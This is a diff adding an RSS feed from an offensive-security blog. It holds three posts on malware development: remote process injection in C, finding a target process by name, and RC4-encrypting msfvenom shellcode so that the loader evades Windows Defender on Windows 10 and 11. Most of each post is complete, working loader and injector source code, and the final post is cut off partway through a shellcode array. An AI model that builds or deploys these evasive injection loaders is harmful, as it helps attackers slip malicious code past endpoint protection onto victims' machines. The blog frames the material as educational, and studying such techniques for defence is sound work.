@@ -1,0 +1,1455 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>r0x0rz</title><description>Offensive Security Stuff</description><link>https://r0x0rzx.github.io/</link><language>en</language><item><title>0x03 - Bypassing Windows Defender using RC4 Encryption</title><link>https://r0x0rzx.github.io/posts/maldev/0x3-windef-bypass-rc4/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/maldev/0x3-windef-bypass-rc4/</guid><pubDate>Sat, 22 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::warning
+This blog post is shared purely for learning and educational purposes. I do not support or take responsibility for any misuse or unethical actions performed using the information provided. Please use this knowledge responsibly and within legal boundaries.
+:::&lt;/p&gt;
+&lt;p&gt;Alright, earlier we talked about loader and process injection techniques, but as you probably noticed, once we compiled our code, &lt;code&gt;Windows Defender&lt;/code&gt; flagged the binary as malicious and deleted. That&apos;s because we embedded &lt;code&gt;Metasploit&lt;/code&gt; shellcode directly into it. Since metasploit is a well known framework and most security tools already have signatures for its payloads.&lt;/p&gt;
+&lt;p&gt;So today, we gonna add payload encryption function to our previous code using RC4 encryption that can bypass detection and worked on window 11 as well.&lt;/p&gt;
+&lt;h3&gt;Intro to RC4 Encryption&lt;/h3&gt;
+&lt;p&gt;There are serveral ways to encrypt our payload but for this blog, I choose &lt;code&gt;RC4&lt;/code&gt; because it&apos;s fast and efficient. And &lt;code&gt;RC4&lt;/code&gt; use bidirectional encryption algorithm which mean we can use the same function for encryption and decryption. You can read more about &lt;code&gt;RC4&lt;/code&gt; encryption online but this is out of scope for now.&lt;/p&gt;
+&lt;p&gt;And there are multiple ways online to implement &lt;code&gt;RC4&lt;/code&gt; encryption in C and I took the encryption code from &lt;a href=&quot;https://wiki.vulnlab.com/lab-notes/c2-loaders/rc4-encryption&quot;&gt;xct&apos;s&lt;/a&gt; blog and made a little bit changes to use in our code.&lt;/p&gt;
+&lt;h3&gt;Encrypting Shellcode&lt;/h3&gt;
+&lt;p&gt;First, generate the shellcode using &lt;code&gt;msfvenom&lt;/code&gt; and use this python script to encrypt the payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+def rc4(data, key):
+    keylen = len(key)
+    s = list(range(256))
+    j = 0
+    # KSA
+    for i in range(256):
+        j = (j + s[i] + key[i % keylen]) % 256
+        s[i], s[j] = s[j], s[i]
+    # PRGA
+    i = 0
+    j = 0
+    encrypted = bytearray()
+    for n in range(len(data)):
+        i = (i + 1) % 256
+        j = (j + s[i]) % 256
+        s[i], s[j] = s[j], s[i]
+        encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])
+    return encrypted
+
+pShellcode = bytearray([
+  0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0 # REPLACE YOUR SHELLCODE HERE FROM MSF
+  
+])
+
+key = b&quot;kernel32.dll&quot; # set your secrypt key here for both encryption and decryption
+encrypted = rc4(pShellcode, key)
+print(&quot;unsigned char encShellcode[] = {&quot;)
+
+for i, b in enumerate(encrypted):
+    if i % 16 == 0:
+        print(&quot;    &quot;, end=&quot;&quot;)
+    print(f&quot;0x{b:02X}, &quot;, end=&quot;&quot;)
+    if i % 16 == 15:
+        print()
+print(&quot;\n};&quot;)
+
+print(f&quot;\nShellcode length: {len(encrypted)} bytes&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And run it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shane@maldev /rc4 % python3 rc4.py
+unsigned char encShellcode[] = {
+    0x68, 0x94, 0xDD, 0x9A, 0x55, 0xEA, 0xD3, 0x58, 0x82, 0xBB, 0xB1, 0x60, 0x2E, 0x4E, 0x64, 0x43, 
+    0xE6, 0x00, 0x1E, 0xBC, 0xC0, 0xBD, 0xE5, 0x0D, 0xB5, 0x01, 0x67, 0x53, 0xE9, 0x2D, 0x82, 0x9E, 
+    0xCF, 0x1A, 0xDE, 0x35, 0x0B, 0x86, 0xF0, 0xBF, 0x2B, 0xC4, 0x19, 0xDC, 0x0B, 0x82, 0x5A, 0xA8, 
+    0x76, 0x79, 0xB1, 0x45, 0xFA, 0x50, 0x8D, 0x3E, 0x43, 0xD2, 0x95, 0xF1, 0x6B, 0xEA, 0x33, 0x9C, 
+    0x32, 0xDA, 0x02, 0x8C, 0xEE, 0x06, 0x92, 0xC3, 0x0A, 0xC1, 0xDA, 0x32, 0x10, 0x8F, 0x55, 0x8C, 
+    0xB6, 0x18, 0x06, 0x95, 0xC3, 0xA1, 0x06, 0x28, 0xCA, 0x89, 0xA2, 0xE8, 0xED, 0xA9, 0x08, 0x21, 
+    0x86, 0x93, 0x17, 0x59, 0x1C, 0x66, 0x6A, 0x95, 0x8E, 0x17, 0x04, 0x69, 0xA3, 0x1E, 0x04, 0x17, 
+    0x34, 0xCD, 0xF1, 0xD5, 0xA6, 0x92, 0x7B, 0x7E, 0x90, 0xD0, 0xFA, 0x19, 0x29, 0xE1, 0x0D, 0xE1, 
+    0xF6, 0x3D, 0x7F, 0x19, 0x87, 0x78, 0x7A, 0x89, 0xEB, 0x16, 0xA6, 0x7F, 0xD7, 0xD9, 0xA4, 0x81, 
+    0xC3, 0x7A, 0x9A, 0x65, 0x8F, 0x76, 0xE1, 0xA6, 0x51, 0xF9, 0xB4, 0xA9, 0x73, 0xC0, 0x92, 0xE7, 
+    0x1B, 0x4C, 0x88, 0x64, 0xFA, 0x9D, 0x0F, 0xE2, 0x1B, 0x07, 0x2B, 0xFE, 0x44, 0xD1, 0x7F, 0x71, 
+    0xD5, 0x88, 0xFA, 0x07, 0xFB, 0xB8, 0xF5, 0xD9, 0x49, 0x3F, 0x3E, 0x7F, 0x06, 0x8F, 0xB9, 0x73, 
+    0xB1, 0xF4, 0xC8, 0x9A, 0xF7, 0x4D, 0xAD, 0x0E, 0xE9, 0x51, 0xE7, 0x01, 0x8B, 0xF2, 0x3A, 0x2C, 
+    0x4D, 0x47, 0xEA, 0xFC, 0xF6, 0xF8, 0x68, 0x33, 0x24, 0xE9, 0xDE, 0xEA, 0x90, 0x56, 0x84, 0x72, 
+    0xA1, 0x5E, 0x79, 0x25, 0x3A, 0x7E, 0x32, 0x59, 0xC2, 0xEF, 0x7B, 0x93, 0xDE, 0xE3, 0x5F, 0x16, 
+    0xBF, 0x6F, 0xD8, 0x29, 0xFF, 0xEE, 0xA2, 0x74, 0x5A, 0x5F, 0x52, 0x0E, 0xEC, 0x5C, 0xA8, 0x98, 
+    0x25, 0x8E, 0x27, 0x43, 0x17, 0x93, 0x20, 0x7A, 0x08, 0x0B, 0x2C, 0x00, 0xF6, 0x7C, 0x9D, 0x27, 
+
+};
+
+Shellcode length: 272 bytes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Decrypt Function in C&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;VOID RC4Decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t keylen)
+{
+    printf(&quot;[*] Decrypting the shellcode.\n&quot;);
+    unsigned char s[256];
+    int i, j;
+    // KSA (Key-Scheduling Algorithm)
+    for (i = 0; i &amp;lt; 256; ++i)
+        s[i] = (unsigned char)i;
+    j = 0;
+    for (i = 0; i &amp;lt; 256; ++i) {
+        j = (j + s[i] + key[i % keylen]) &amp;amp; 0xFF;  // %256
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+    // PRGA (Pseudo-Random Generation Algorithm)
+    i = 0;
+    j = 0;
+    for (size_t n = 0; n &amp;lt; data_len; ++n) {
+        i = (i + 1) &amp;amp; 0xFF;
+        j = (j + s[i]) &amp;amp; 0xFF;
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        data[n] ^= s[(s[i] + s[j]) &amp;amp; 0xFF];
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now all we need to do is to call that function in our main before calling &lt;code&gt;InjectRemoteProcess&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;unsigned char key[] = &quot;kernel32.dll&quot;; // this is your key
+RC4Decrypt(encShellcode, sizeof(encShellcode), key, strlen((char*)key));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Full Source Code&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;TlHelp32.h&amp;gt;
+#include &amp;lt;stddef.h&amp;gt;
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char encShellcode[] = {
+    0x68, 0x94, 0xDD, 0x9A, 0x55, // Replace your encrypted shellcode from python script output
+};
+
+VOID RC4Decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t keylen)
+{
+    printf(&quot;[*] Decrypting the shellcode.\n&quot;);
+    unsigned char s[256];
+    int i, j;
+    // KSA (Key-Scheduling Algorithm)
+    for (i = 0; i &amp;lt; 256; ++i)
+        s[i] = (unsigned char)i;
+    j = 0;
+    for (i = 0; i &amp;lt; 256; ++i) {
+        j = (j + s[i] + key[i % keylen]) &amp;amp; 0xFF;  // %256
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+    // PRGA (Pseudo-Random Generation Algorithm)
+    i = 0;
+    j = 0;
+    for (size_t n = 0; n &amp;lt; data_len; ++n) {
+        i = (i + 1) &amp;amp; 0xFF;
+        j = (j + s[i]) &amp;amp; 0xFF;
+        unsigned char tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        data[n] ^= s[(s[i] + s[j]) &amp;amp; 0xFF];
+    }
+}
+
+DWORD FindProcessId(const wchar_t* processname)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32W pe32;
+    DWORD result = 0;
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcessSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+
+    do
+    {
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            result = pe32.th32ProcessID;
+            //wprintf(L&quot;Process ID: %lu\n&quot;, result);
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32));
+    CloseHandle(hProcessSnap);
+    return result;
+}
+
+// we create a function called InjectRemoteProcess
+BOOL InjectRemoteProcess(DWORD Pid, PBYTE pShellcode, SIZE_T pShellcodeSize) {
+    // open process to specify Pid
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+    if (hProcess == NULL) {
+        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+    // allocating memory into a specific process id that you supply
+    PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (pShellcodeAddress == NULL) {
+        printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+    // write our shellcode into allocated memory
+    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {
+        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+    // change to PAGE_EXECUTE_READWRITE
+    DWORD dwOldProtection = NULL;
+    if (!VirtualProtectEx(hProcess, pShellcodeAddress, pShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtection)) {
+        printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    // create new thread into remote process
+    printf(&quot;[i] Create remote thread to execute payload\n&quot;);
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, 0, NULL);
+    if (hRemoteThread == NULL) {
+        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Done\n&quot;);
+    CloseHandle(hProcess);
+    CloseHandle(hRemoteThread);
+    return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[])
+{
+    if (argc != 2) {
+        wprintf(L&quot;Usage: %s &amp;lt;process_name.exe&amp;gt;\n&quot;, argv[0]);
+        return 1;
+    }
+    const wchar_t* pName = argv[1];
+
+    DWORD dwProcessID = FindProcessId(pName);
+    if (dwProcessID == 0) {
+        wprintf(L&quot;[!] Process %ls not found.\n&quot;, pName);
+        return 1;
+    }
+    wprintf(L&quot;[!] Process ID of %ls: %lu\n&quot;, pName, dwProcessID);
+   
+    unsigned char key[] = &quot;kernel32.dll&quot;;
+    RC4Decrypt(encShellcode, sizeof(encShellcode), key, strlen((char*)key));
+    
+    SIZE_T pShellcodeSize = sizeof(encShellcode);
+    // calling the function
+    if (!(InjectRemoteProcess(dwProcessID, encShellcode, pShellcodeSize))) {
+        return -1;
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Running the Binary&lt;/h3&gt;
+&lt;p&gt;Now it&apos;s time to run our binary with Windows Defender turned on.&lt;/p&gt;
+&lt;h4&gt;Windows 10&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4&gt;Windows 11&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev8.jpeg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/maldev/maldev9.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Task for you&lt;/h3&gt;
+&lt;p&gt;You can apply the same method to the shellcode loader that I covered in the &lt;a href=&quot;http://localhost:4321/posts/maldev/0x0-basic-shellcode-injection/&quot;&gt;first post&lt;/a&gt; of this series.&lt;/p&gt;
+&lt;h3&gt;Other Techniques&lt;/h3&gt;
+&lt;p&gt;There are also other payload encryption and obfuscation techniques such as &lt;code&gt;XOR&lt;/code&gt;, &lt;code&gt;AES&lt;/code&gt;, &lt;code&gt;IPv4/IPv6Fuscation&lt;/code&gt;, &lt;code&gt;MACFuscation&lt;/code&gt;, &lt;code&gt;UUIDFuscation&lt;/code&gt;, etc...&lt;/p&gt;
+&lt;p&gt;See below and try to implement these techniques in your code.&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;NUL0x4C/HellShell&quot;}&lt;/p&gt;
+&lt;h3&gt;References&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;https://wiki.vulnlab.com/lab-notes/c2-loaders/rc4-encryption&lt;/li&gt;
+&lt;li&gt;https://github.com/gatariee/gocheck&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>0x02 - Process Injection Part II</title><link>https://r0x0rzx.github.io/posts/maldev/0x2-process-injection-two/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/maldev/0x2-process-injection-two/</guid><pubDate>Wed, 19 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;From the part I of &lt;code&gt;Process Injection&lt;/code&gt; blog, we used process ID (PID) as a argument to inject our shellcode. But to get &lt;code&gt;PID&lt;/code&gt;, we had to rely on other tool like &lt;code&gt;Process Hacker&lt;/code&gt; to find the &lt;code&gt;PID&lt;/code&gt; of a target program. It had a few extra steps to get the job done. So today, instead of talking about a new technique, we&apos;re going to improve our previous code. This time, we&apos;ll use the process name instead of the process ID.&lt;/p&gt;
+&lt;p&gt;So, instead of manually finding the &lt;code&gt;PID&lt;/code&gt; ourself, we can simply provide the program name like &lt;code&gt;notepad.exe&lt;/code&gt; and let the program find the &lt;code&gt;PID&lt;/code&gt; itself.&lt;/p&gt;
+&lt;p&gt;:::note
+Before we start, you might notice that I&apos;m using wide-character functions like &lt;code&gt;wmain&lt;/code&gt;, &lt;code&gt;Process32FirstW&lt;/code&gt;, &lt;code&gt;wcscmp&lt;/code&gt;, and &lt;code&gt;wprintf&lt;/code&gt;. Windows APIs come in two versions &lt;code&gt;ANSI (char, 8-bit)&lt;/code&gt; and &lt;code&gt;Unicode (wchar_t, 16-bit)&lt;/code&gt;. Both still work, but modern Windows mainly use Unicode internally. So it’s better to use the &lt;code&gt;Unicode (wide-char)&lt;/code&gt; functions because they handle all languages properly and are the recommended standard today.
+:::&lt;/p&gt;
+&lt;h3&gt;FindProcessId Function&lt;/h3&gt;
+&lt;p&gt;Let&apos;s review our new function that find process ID of target program.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DWORD FindProcessId(const wchar_t* processname)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32W pe32;
+    DWORD result = 0;
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcessSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+
+    do
+    {
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            result = pe32.th32ProcessID;
+            //wprintf(L&quot;Process ID: %lu\n&quot;, result);
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32));
+
+    CloseHandle(hProcessSnap);
+    return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For this function, I took a reference from this &lt;a href=&quot;https://stackoverflow.com/questions/20874381/get-a-process-id-in-c-by-name&quot;&gt;stackoverflow&lt;/a&gt; post and make a little bit changes for our program.&lt;/p&gt;
+&lt;h3&gt;Taking a Snapshots&lt;/h3&gt;
+&lt;p&gt;We declared the variables first.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE hProcessSnap;
+PROCESSENTRY32W pe32; // see below about this structure
+DWORD result = 0;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;hProcessSnap&lt;/code&gt; is a HANDLE for &lt;code&gt;CreateToolhelp32Snapshot&lt;/code&gt;. &lt;code&gt;result&lt;/code&gt; will be the return data for PID.&lt;/p&gt;
+&lt;p&gt;First we call &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot&quot;&gt;CreateToolhelp32Snapshot&lt;/a&gt; function for enumerating processes.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE CreateToolhelp32Snapshot(
+  [in] DWORD dwFlags,
+  [in] DWORD th32ProcessID
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This API creates a snapshot of all running processes on the system. And we used &lt;code&gt;TH32CS_SNAPPROCESS&lt;/code&gt; in here which can give us a list of all processes. When enumerating all the processes, the second parameter must be &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;As per microsoft documentation, to get the first running process, we can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first&quot;&gt;Process32First&lt;/a&gt; and for the rest of the processes, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next&quot;&gt;Process32Next&lt;/a&gt; will be required.&lt;/p&gt;
+&lt;p&gt;So to use &lt;code&gt;Process32First&lt;/code&gt; and &lt;code&gt;Process32Next&lt;/code&gt;, we will need one structure which is called &lt;code&gt;PROCESSENTRY32W&lt;/code&gt;,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In case if you&apos;re not familiar with structure, structure is a user defined data type that allows us to group variables of different data types under a single name. As you see above image, It&apos;s like a folder, windows fills it with these informations.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Process ID&lt;/li&gt;
+&lt;li&gt;Parent process ID&lt;/li&gt;
+&lt;li&gt;Number of threads&lt;/li&gt;
+&lt;li&gt;Executable filename&lt;/li&gt;
+&lt;li&gt;etc..&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That&apos;s why we initialized &lt;code&gt;PROCESSENTRY32W pe32;&lt;/code&gt; in this first place. And it is also recommend to check the size of the structure &lt;code&gt;pe32.dwSize = sizeof(PROCESSENTRY32W);&lt;/code&gt;. Because if we didn&apos;t, API call would fail if the structure changes in a future Windows update. We can access the struct data using dot (.) like &lt;code&gt;pe32.th32ProcessID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then &lt;code&gt;Process32FirstW&lt;/code&gt; try to get the first process&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once &lt;code&gt;Process32FirstW&lt;/code&gt; succeeds, we can iterate through the remaining processes in the snapshot with &lt;code&gt;Process32NextW&lt;/code&gt; using do while loop.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;do
+    {
+        // comparing process name with our target, pe32.szExeFile is the process name from struct
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            // if found, target process ID will be saved in result
+            result = pe32.th32ProcessID;
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32)); // loop through until it&apos;s done
+
+    CloseHandle(hProcessSnap); // And close the handle
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Full Source Code&lt;/h3&gt;
+&lt;p&gt;So our full code will be as shown below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;TlHelp32.h&amp;gt;
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char pShellcode[] = {
+  0xFC, 0x48, 0x83, 0xE4, 0xF0 // REPLACE YOUR SHELLCODE HERE
+  
+};
+
+DWORD FindProcessId(const wchar_t* processname)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32W pe32;
+    DWORD result = 0;
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcessSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+
+    do
+    {
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            result = pe32.th32ProcessID;
+            //wprintf(L&quot;Process ID: %lu\n&quot;, result);
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32));
+
+    CloseHandle(hProcessSnap);
+    return result;
+}
+
+// we create a function called InjectRemoteProcess
+BOOL InjectRemoteProcess(DWORD Pid, PBYTE pShellcode, SIZE_T pShellcodeSize) {
+    // open process to specify Pid
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+    if (hProcess == NULL) {
+        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+
+    // allocating memory into a specific process id that you supply
+    PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (pShellcodeAddress == NULL) {
+        printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+
+    // write our shellcode into allocated memory
+    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {
+        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+
+    // change to PAGE_EXECUTE_READWRITE
+    DWORD dwOldProtection = NULL;
+    if (!VirtualProtectEx(hProcess, pShellcodeAddress, pShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtection)) {
+        printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // create new thread into remote process
+    printf(&quot;[i] Create remote thread to execute payload\n&quot;);
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, 0, NULL);
+    if (hRemoteThread == NULL) {
+        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Done\n&quot;);
+
+    CloseHandle(hProcess);
+    CloseHandle(hRemoteThread);
+    return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[])
+{
+    if (argc != 2) {
+        wprintf(L&quot;Usage: %s &amp;lt;process_name.exe&amp;gt;\n&quot;, argv[0]);
+        return 1;
+    }
+
+    const wchar_t* pName = argv[1];
+
+    DWORD dwProcessID = FindProcessId(pName);
+    if (dwProcessID == 0) {
+        wprintf(L&quot;[!] Process %ls not found.\n&quot;, pName);
+        return 1;
+    }
+
+    wprintf(L&quot;\n[!] Process ID of %ls: %lu\n&quot;, pName, dwProcessID);
+
+    SIZE_T pShellcodeSize = sizeof(pShellcode);
+    // calling the function
+    if (!(InjectRemoteProcess(dwProcessID, pShellcode, pShellcodeSize))) {
+        return -1;
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Running the program&lt;/h3&gt;
+&lt;p&gt;Let&apos;s just run the program with our target name.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>0x01 - Process Injection Part I</title><link>https://r0x0rzx.github.io/posts/maldev/0x1-process-injection/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/maldev/0x1-process-injection/</guid><pubDate>Tue, 18 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Intro&lt;/h3&gt;
+&lt;p&gt;So after writing local shellcode injection, now let&apos;s inject our shellcode into remote process which is also called process injection. We can inject our shellcode into other process such as &lt;code&gt;notepad.exe&lt;/code&gt;, &lt;code&gt;explorer.exe&lt;/code&gt;, etc...&lt;/p&gt;
+&lt;p&gt;To inject shellcode into other process, we&apos;re gonna need these WinAPI.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt; - To open a process with specific PID&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;VirtualAllocEx&lt;/a&gt; - Same as &lt;code&gt;VirtualAlloc&lt;/code&gt; but it allow us for allocating memory for remote process.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory&lt;/a&gt; - To write our shellcode into remote process&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&quot;&gt;VirtualProtectEx&lt;/a&gt; - To change memory region to be executable&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread&lt;/a&gt; - Similar to &lt;code&gt;CreateThread&lt;/code&gt; but for remote thread.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Source Code&lt;/h3&gt;
+&lt;p&gt;Let review the source code first to get better vision.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Tlhelp32.h&amp;gt;
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
+unsigned char pShellcode[] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
